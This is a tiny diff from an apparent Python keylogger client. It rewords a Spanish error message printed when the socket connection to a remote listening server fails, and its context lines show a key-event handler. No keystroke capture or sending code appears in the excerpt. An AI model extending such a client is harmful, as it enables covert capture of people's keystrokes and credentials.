@@ -13,7 +13,7 @@ try:
     s = socket.socket()
     s.connect((host, port))
 except:
-    print("\n\n[+] Tienes que iniciar primero el servidor en escucha\n")
+    print("\n[!] Se ha acontecido un error en la conexión\n")
     sys.exit(1)
 
 def on_key_event(event):
